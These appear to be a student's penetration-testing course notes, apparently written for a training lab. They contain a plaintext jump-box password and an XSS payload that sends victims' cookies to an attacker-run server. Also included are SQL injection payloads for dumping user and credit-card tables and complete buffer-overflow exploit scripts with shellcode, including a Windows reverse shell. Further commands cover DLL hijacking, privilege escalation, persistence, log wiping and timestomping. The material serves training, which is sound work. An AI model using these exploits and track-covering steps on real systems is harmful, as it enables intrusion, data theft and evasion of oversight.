https://github.com/Misfit51/COSC/blob/main/Networking%20v2


Stack Username Password JumpBox 19 RYVA-503-M KolgrymTG7RdBub 10.50.27.69

Lin Ops - 10.50.32.116 (https://vta.cybbh.space/project/instances/)(Domain for login is IPA) CTFD - http://10.50.20.30:8000/ FG - https://sec.cybbh.io/public/security/latest/lessons/lesson-1-pentest_sg.html

For WIN-OPs xfreerdp /v:10.50.38.228 /u:student /glyph-cache /dynamic-resolution /clipboard

ssh -X student@10.50.32.116 @linops: ssh -MS /tmp/jump student@10.50.27.69 @linops: ssh -S /tmp/jump dummy -O forward -D9050 ###Different port forwarding to allow proxychains

for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done

proxychains nmap 192.168.28.97,98,100,105,111,120

proxychains nc 192.168.28.100 80 proxychains nc 192.168.28.111 80

ssh -S /tmp/jump dummy -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.111:80 -L3333:192.168.28.111:22 ###tunnel to webpages and ssh (Replace forward with cancel to kill connection)

firefox 127.0.0.1:1111 ###To open a webpage after a tunnel is setup

ssh -MS /tmp/t1 student@127.0.0.1 -p 3333

ssh -S /tmp/t1 dummy -O forward -L4444:192.168.50.100:22

ssh -MS /tmp/t2 credentials@127.0.0.1 -p 4444

192.168.150.245 tunnels
ssh -MS /tmp/jump student@10.50.27.69 ssh -S /tmp/jump dummy -O forward -D9050 ssh -S /tmp/jump dummy -O forward -L1111:192.168.28.120:4242 ssh -MS /tmp/t1 student@127.0.0.1 -p 1111 ssh -S /tmp/jump dummy -O cancel -D9050 ssh -S /tmp/t1 dummy -O forward -D9050 ssh -S /tmp/t1 dummy -O forward -L2222:192.168.150.245:9999

Pen Testing Overview
Phase 1:Mission Definition Define mission goals Determine scope of mission Define ROE

Phase 2:Recon Information gathering about the target through public sources

Phase 3:Footprinting Accumulate data through scanning and/or interaction with the target/target resources

Phase 4:Exploitation & Initial Access Gain an initial foothold on network

Phase 5:Post-Exploitation Establish persistence Escalate privileges Cover your tracks Exfiltrate target data

Phase 6:Document Missions Document and report mission details

Pen Test Reporting OPNOTES Executive summary Technical summary Reasons to report What to report Screen captures

Vulnerability and Exploit research###
Exploit-db

Scanning and Recon###
OSINT

#Scrapting Data Script pip install lxml requests

#!/usr/bin/python

import lxml.html import requests

page = requests.get('http://quotes.toscrape.com') tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)

Only things that will change in script are the website and xpath
Advanced scanning techniquws 1.Host discovery Find hosts that are online (ping sweep) 2.Port Enumeration Find ports for each host that is online 3.Port Interrogation Find what service is running on each open/available port

proxychains nmap --script=http-enum 192.168.28.100 ls -l /usr/share/nmap/scripts ###Where the scripts are stored, grep what you want

Web Exploitation
Day 2 (XSS)
HTTP
Request/Response Various tools to view tcpdump wireshark Developer Console

HTTP Methods GET POST HEAD PUT

HTTP Response Codes 4xx = Client side 5xx = Server side

Cookie = file set locally on system from website

robots.txt is step 1

Cross-Site Scripting (XSS) Overview
Reflected XSS Delivered through intermediate media, such as a link in an email Characters are noramlly illegal in URLs can be Base64 encoded

Stored XSS Resides on vulnerable website Only requires user to visit page

python3 -m http.server
<script>document.location="http://10.50.32.116:8000/"+document.cookie;</script>
Malicious file uploads
  
  
Command Injection
;

ssh-keygen -t rsa -b 4096 ###Regenerates ssh keys (ssh keys are stored in home as a hidden file) cat .ssh/id_rsa.pub

rm -rf old .ssh from www (/var/www/.ssh) mkdir new .ssh copy id_rsa.pub into command, " > /var/www/.ssh/authorized_keys ssh -i .ssh/id_rsa www-data@10.50.xx.xx (-i specifies which key to use)(Hope it works)

ssh -S /tmp/jump dummy -O forward -L1111:10.100.28.40:80 -L2222:10.100.28.40:4444 -L3333:10.100.28.48:80 -L4444:10.100.28.48:4444

Day 3
SQL
Select - Extracts data from database Union - Combine the result set of two or more select statement

mysql (loads sql database) show databases; (default databases are information_schema, mysql and performance_schema) SHOW tables FROM session; (session database) SHOW columns FROM session.Tires; SELECT tireid,name,size,cost FROM session.Tires; Show columns from session.car; SELECT tireid,name,cost,size FROM session.Tires UNION SELECT carid,name,color,cost FROM session.car;

SQL Injection
' OR 1='1

; ls to test

F12 for dev console HTTP GET request from URL field with POST request ex.) http://10.50.26.140/login.php?username=%27OR+1%3D%271&passwd=%27OR+1%3D%271

POST Method
Step 1.) ID Vulnerable Field
Audi ' OR 1='1

Step 2.) Identify number of columns
Audi ' UNION SELECT 1,2,3,4,5 #

Step 3.) Create Golden Statement
Audi ' UNION SELECT table_scheme,2,table_name,column_name,5 FROM information_schema.columns # Audi ' UNION SELECT {column},{column},{column} FROM database.table #

Step 4.) Craft Query
Audi ' UNION SELECT studentID,2,username,passwd,5 FROM session.userinfo # Audi ' UNION SELECT 1,2,name,pass,5 FROM session.user #

GET Method
Identify vulnerable field (selection 2)
Done in URL http://10.50.26.140/uniondemo.php?Selection=2 OR 1=1 #On all options until vulnerable one is found

ID # of columns
?Selection=2 UNION SELECT 1,2,3

Golden Statement (remember the order displayed 1,2,3)
?Selection=2 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns ?Selection=2 UNION SELECT id,pass,name FROM session.user ?Selection=2 UNION SELECT id,pass,@@version FROM session.user

Annotate databases, tables, columns
Database: session, otherdb

Session Tables: Tires, car, session_log, user, userinfo

Otherdb Tables: more, infor

Columns (Tires): tireid, name, size, cost (car): carid, name, type, cost, color, year

delete from comment where ID = 57 ;

sqlinjection orders id sqlinjection orders date sqlinjection orders member sqlinjection payments id sqlinjection payments creditcard_number sqlinjection payments date sqlinjection payments order sqlinjection permissions id sqlinjection permissions level sqlinjection permissions name sqlinjection permissions description sqlinjection products id sqlinjection products name

.php?category=1 UNION SELECT id,creditcard_number,3 FROM sqlinjection.payments

Day 4
Reverse Enginnering
X86_64 Assembly
Heap Stack General Register Control Register Flags Register

Reverse Engineering Workflow
Static Behavioral Dynamic Disassembly Document Findings

main: mov rax, 16 //Moving into rax the value of 16 push rax //Pushing value in rax (16) onto the stack. RSP is pushed up by 8 bytes jmp mem2 //Jump to mem2 function

mem1: mov rax, 0 //Moving into rax the value of 0 ret //Return

mem2: pop r8 //Popping value (16) off of stack and storing it in r8. RSP falls by 8 bytes cmp rax, r8 //Compare to rax value (16) the value of r8 (16) je mem1 //Previous comparison ends with zero flag set; jump to mem1

main: move rcx, 25 //Moving into rcx the value of 25 mov rbx, 62 //Moving into rbx the value of 62 jmp mem1 //Jump to mem1

mem1: sub rbx, 40 //Subtract from the value in rbx (62) 40. Result is rbx=22. mov rsi, rbx //Moving into rsi the value of rbx (22) cmp rcx, rsi //Compare to rcx (25) the value of rsi (22) jmple mem2 //Zero flag is not set. RSI < RCX. Jump to mem2

mem2: mov rax, 0 //Moving into rax the value of 0 ret //Return

Patching
Find success / failure Adjust

Exploit Development
Buffer Overflow Defenses Non executable (NX) stack Address Space Layout Randomization (ASLR) Data Execution Prevention (DEP) Stack Canaries Position Independent Executable (PIE)

chmod +x disass Disassemble portion of the program info <...> Supply info for specific stack areas x/256c $ Read characters from specific adapter break

Establish a break point
run <<<$(echo "") info functions (shows all functions) pdisass main (disassembles main function) pdisass

env - gdb ./func show env unset env COLUMNS unset env LINES run (enter a string thats to long)

For buffer # - https://wiremask.eu/tools/buffer-overflow-pattern-generator/ Use the default 200 characters set as buffer. Once run, copy the EIP, get the offset number from wiremask as the new buffer = "A" * number

env - gdb ./func run (Enter enough characters to cause segmentation fault) info proc map (Note first address after heap, last address of stack: 0xf7de1000, 0xffffe000 for this example) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
Grab the first 4 and reverse them Like so: 0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7" 0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7" 0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7" 0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"

Set eip in script to the top reversed value

Run: msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python (shell code, copy and paste into python script) Create nop sled: nop = "\x90" * 15 Add eip, nop and buff to print: print(buffer+eip+nop+buf)

msfvenom --list payloads

./func <<<$(python linbuff.py) If segmentation fault, unfuck it

Complete script example
#!/usr/bin/env python 2 3 #stack is between 0xf7de1000 and 0xffffe000 4 5 #0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7" 6 #0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7" 7 #0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7" 8 #0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7" 9 10 11 buffer = "A" * 62 12 eip = "\x0f\x46\xf6\xf7" 13 14 nop = "\x90" * 15 15 16 buf = b"" 17 buf += b"\xdd\xc7\xbf\x77\xb9\x5e\x18\xd9\x74\x24\xf4\x5d" 18 buf += b"\x33\xc9\xb1\x0a\x83\xc5\x04\x31\x7d\x15\x03\x7d" 19 buf += b"\x15\x95\x4c\x34\x13\x01\x36\x9b\x45\xd9\x65\x7f" 20 buf += b"\x03\xfe\x1e\x50\x60\x68\xdf\xc6\xa9\x0a\xb6\x78" 21 buf += b"\x3f\x29\x1a\x6d\x3c\xad\x9b\x6d\x2a\xc9\x9b\x3a" 22 buf += b"\xff\x98\x7d\x09\x7f" 23 24 print(buffer+eip+nop+buf)

Windows Buffer Overflow
Static
Z:\strings .\secureserverind.exe type .\secureserverind.exe

Behavioral
@winops: .\secureserverind.exe (Run the program, open Resource Monitor, look at connections) @linops: nc 10.50.38.228 9999 (Interact from linops, enter stuff) @linops: make script

#!/usr/bin/env python import socket

buf = "TRUN /.:/" buf += "A" * 50

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(("10.50.38.228", 9999)) print s.recv(1024) s.send(buf) print s.recv(1024)

s.close()

@linops: chmod +x @linops: run it (if no crash, make buffer larger) @winops: Run immunity debugger. Open secureserverind inside the debugger @linops: Go to wiremask. Set length to 10000, make it buf in script, run it @winops: Process will pause. Copy EIP (386F4337), use it to find offset in wiremask (2003) @winops: Rewind and play again @linops: update script with offset, add buf += "BBBB" @linops: Run script @winops: Find EIP, should be 42424242 (BBBB), rewind and play, enter "!mona modules" at bottom to find vulnerable dlls (essfunc) @winops: !mona jmp -r esp -m "essfunc.dll" (also go to windows options, select 2 log data) This will give memory addresses, grab the first 4 @linops: Paste first 4, reverse them @linops: Add nop sled (buf += "\x90" * 15) @linops: run - msfvenom -p windows/shell/reverse_tcp lhost=10.50.32.116 lport=35169 -b "\x00" -f python @linops: Paste the shell code output into script, save @winops: go to carrot, open windows security, virus and threat protection, disable real time protection @linops: New windows, msfconsole, use multi/handler, show options, set payload windows/meterpreter/reverse_tcp @linops: set LHOST 0.0.0.0, set LPORT 35169, run @linops: In other window, run python script, meterpreter session should be established

Final Script:

#!/usr/bin/env python import socket

#625012A0 -> "\xa0\x12\x50\x62" #625012AD -> "\xad\x12\x50\x62" #625012BA -> "\xba\x12\x50\x62" #625012C7 -> "\xc7\x12\x50\x62"

buf = "TRUN /.:/" buf += "A" * 2003 buf += "\xa0\x12\x50\x62" buf += "\x90" * 15 buf += b"\xb8\xb4\xfa\xda\x87\xda\xdc\xd9\x74\x24\xf4\x5a" buf += b"\x33\xc9\xb1\x59\x83\xc2\x04\x31\x42\x10\x03\x42" buf += b"\x10\x56\x0f\x26\x6f\x19\xf0\xd7\x70\x45\xc0\x05" buf += b"\x14\x0e\x70\x9a\x5c\xf5\xfe\x88\x52\x7e\x52\x39" buf += b"\xe0\xf2\x7b\x70\x09\xfd\xcc\x38\xd3\x30\xf3\x11" buf += b"\x27\x53\x8f\x6b\x74\xb3\xae\xa3\x89\xb2\xf7\x75" buf += b"\xe7\x5b\xa5\x0e\x55\xb3\xc1\x53\x66\xb2\x05\xd8" buf += b"\xd6\xcc\xf2\x5a\x16\x58\xb1\x65\x47\x2b\x11\x46" buf += b"\xec\x63\xba\xd6\xf3\xa0\x3f\x1f\x87\x7a\x71\x5f" buf += b"\x21\x09\x45\x14\xb3\xdb\x97\xea\x18\x22\x18\xe7" buf += b"\x61\x63\x9f\x18\x14\x9f\xe3\xa5\x2f\x64\x99\x71" buf += b"\xa5\x7a\x39\xf1\x1d\x5e\xbb\xd6\xf8\x15\xb7\x93" buf += b"\x8f\x71\xd4\x22\x43\x0a\xe0\xaf\x62\xdc\x60\xeb" buf += b"\x40\xf8\x29\xaf\xe9\x59\x94\x1e\x15\xb9\x70\xfe" buf += b"\xb3\xb2\x93\xe9\xc4\x3b\x6c\x16\x99\xab\xa0\xdb" buf += b"\x22\x2b\xaf\x6c\x50\x19\x70\xc7\xfe\x11\xf9\xc1" buf += b"\xf9\x20\xed\xf1\xd6\x8a\x7e\x0c\xd7\xea\x57\xcb" buf += b"\x83\xba\xcf\xfa\xab\x51\x10\x02\x7e\xcf\x1a\x94" buf += b"\x8b\x3d\x3b\x10\xe4\x43\x3b\x51\x95\xca\xdd\x31" buf += b"\x06\x9c\x71\xf2\xf6\x5c\x22\x9a\x1c\x53\x1d\xba" buf += b"\x1e\xbe\x36\x51\xf1\x16\x6e\xce\x68\x33\xe4\x6f" buf += b"\x74\xee\x80\xb0\xfe\x1a\x74\x7e\xf7\x6f\x66\x97" buf += b"\x60\x8f\x76\x68\x05\x8f\x1c\x6c\x8f\xd8\x88\x6e" buf += b"\xf6\x2e\x17\x90\xdd\x2d\x50\x6e\xa0\x07\x2a\x59" buf += b"\x36\x27\x44\xa6\xd6\xa7\x94\xf0\xbc\xa7\xfc\xa4" buf += b"\xe4\xf4\x19\xab\x30\x69\xb2\x3e\xbb\xdb\x66\xe8" buf += b"\xd3\xe1\x51\xde\x7b\x1a\xb4\x5c\x7b\xe4\x4a\x4b" buf += b"\x24\x8c\xb4\xcb\xd4\x4c\xdf\xcb\x84\x24\x14\xe3" buf += b"\x2b\x84\xd5\x2e\x64\x8c\x5c\xbf\xc6\x2d\x60\xea" buf += b"\x87\xf3\x61\x19\x1c\x04\x1b\x52\xa3\xe5\xdc\x7a" buf += b"\xc0\xe6\xdc\x82\xf6\xdb\x0a\xbb\x8c\x1a\x8f\xf8" buf += b"\x9f\x29\xb2\xa9\x35\x51\xe0\xaa\x1f"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(("10.50.38.228", 9999)) print s.recv(1024) s.send(buf) print s.recv(1024)

s.close()

Post Exploitation
chmod 600 /home/student/stolenkey ssh -i home/student/stolenkey jane@1.2.3.4

User Enumeration
net user - Windows cat /etc/passwd - Linux

Process Enumeration
tasklist /v - Windows ps -elf - Linux

Service Enumeration
tasklist /svc - Windows systemctl --type=service - Linux

Network Connection Enumeration
ipconfig /all - Windows ipa - Linux Once on a linux box, cat /etc/hosts

Data Exfil
scp

Local to remote scp /path/to/file student@10.10.10.10:/path/to/dest/file/txt

Remote to local scp student@10.10.10.10:/path/to/file.txt .

ssh -MS /tmp/jump studnet@12.12.12.12

ssh -S /tmp/jump dummy -O forward -L1111:192.168.1.1

/etc/crontab var/spool/crontab

Examples from Post Ex

scp stolenkey student@10.50.32.116:/home/student proxychains ssh -i /home/student/stolenkey comrade@192.168.150.253 -p 3201 comrade::StudentMidwayPassword ssh -S /tmp/t2 dummy -O forward -L3333:192.168.28.9:5985 ssh -S /tmp/t2 dummy -O forward -L4444:192.168.28.9:47001 ssh -S /tmp/t2 dummy -O forward -L5555:192.168.28.9:3389 xfreerdp /v:127.0.0.1:5555 /u:comrade /glyph-cache /dynamic-resolution /clipboard

Privilage Escalation Windows
Integrity - Levels Anonymous SID access token Untrusted - Everyone SID access token (World) Low - Everyone SID access token Medium - Authenticated Users High - Admin System - System services

UAC User Account Control

PS Z:> .\sigcheck.exe -m -accepteula C:\Windows\System32\eventvwr.exe

Scheduled Tasks: Permissions to Run as SYSTEM

Demo: Services Take note of when it runs, path to executable, do we have write access to that directory?

DLL Highjacking: .\Procmon -accepteula Filter: Process name, contains, putty.exe Path, contains, .dll Result, is, NAME NOT FOUND

msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll scp studnet@ip:/home/student/SSPICLI.dll C:\users\student\desktop drop dll in file -> run, kill the service if already running with (get-process | ? {$_.name -contains "putty"}).kill()

.exe Replacement: (Write to directory and rename it) msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\desktop\whoami.txt' -f dll > putty.exe scp studnet@ip:/home/student/putty.exe C:\users\student\desktop

Use run keys for persistance (HKLM specifically)

auditpol /get /category:* auditpol /get /category:* | findstr /i "success failure"

Microsoft Event IDs 4624/4625 Successful/failed login 4720 Account created 4672 Administrative

msfvenom -l payloads

Privilage Escalation Linux
Sudo Gotchas vim, cat, grep, can access files not intended !/bin/bash gives you a shell

IF SUDO FOR ANYTHING - https://gtfobins.github.io/

SUID/SGID ls -l $(which passwd) will show suid bit suid bit - run as permissions of the user owner sticky bit - for any directory where it is turned on, only the user who created it can delete it

find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files find / -type f -perm /6000 -ls 2>/dev/null # Find SUID/SGID files START AT THE TOP

CRON - scheduled tasks crontab -l # lists cronjobs crontab -e # make cronjob crontab -r # remove cronjob crontab -u -l # list other users cronjobs ls -l /var/spool/cron/crontabs # user level cronjobs cat /etc/crontab # system level cronjobs crontab.guru - for cronjob time help ls -l /etc/cron.hourly ls -l /etc/cron.daily ls -l /etc/cron.weely ls -l /etc/cron.monthly

World Writable Files and Folders locations: /tmp, /var/tmp find / -type d -perm /2 -ls 2>/dev/null # find world writable directories

Dot '.' in PATH (pwd)

Vulnerable Software in Services mess with it, see what it does, exploit

Persistence
Adding or Hijacking a user account you can make an account by editting /etc/passwd

Artifiacts
lsof

NIX-ism
unset HISTFILE Be aware of init system in use, SYSTEMV, SYSTEMD # ps -p 1

Figure out init type ls -latr /proc/1/exe stat /sbin/init

Auditing SystemD journalctl _TRANSPORT=audit journalctl _TRANSPORT=audit | grep 603

Logs for Covering Tracks /var/log

Working with logs journalctl -f -u ssh journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4

Cleaning logs Save INODE number, mv, cp, cat Nuclear rm -rf /var/log/... cat /dev/null > /var/log/... echo > /var/log/... Precise egrep

Timestomp (Nix) touch -c -t 202112151856 test # changes the timestamp of test, stat test releaves the change touch -r msfinstall test # changes test to have msfinstalls timestamps, stat looks clean

Remote logging /etc/rsyslog.conf # older versions /etc/rsyslog.d/* # more modern Find out, grep "Include . older format, @ = udp, @@ = tcp

DEMO sudo -l # always first apt-get permissions, wtf is that, gtfobins knows sudo apt-get changelog apt # gives a pager of info !/bin/sh # inside the pager we now have a shell, run id, its root

Demo 2 sudo -l we have cat /var/log/syslog* permissions, * being anything, cat being contatinate sudo cat /var/log/syslog /etc/shadow # This works, wild find / -type f -perm /6000 -ls 2>/dev/null # look for anything strange that root owns cat /etc/shadow # because suid bit is set gtfobins nice # IGNORE the install instruction nice /bin/sh -p, check euid

Test Review
Recon Nmap (--script) Ping Sweep Web Page cat /etc/hosts cat /etc/passwd sudo -l Enumerate World Writable Directories SUID SGID binaries ps -elf, arp -a, ss -antp, ip n, ip a, uname -a, ls -al, ip route Check all crontab locations, var/spool/cron/crontab, etc/crontab, etc/cron.d

Web Ex SQL Injection Auth Bypass Test with 1=1 Directory Traversal "File to search for" Malicious File Upload Command Injection ; whoami

Reverse Enginnering Bit shifting, x << 4 = 16, x = 1 because 16 8 4 2 1

Exploit Dev Already given everything, pull back to box, break it (buffer overflow), modify, execute

Post Ex Remote logging = check rsyslog, check for security products

Win Exp DLL Highjacking, or Exe replacement. Auditpol.

Lin Exp GTFOBins
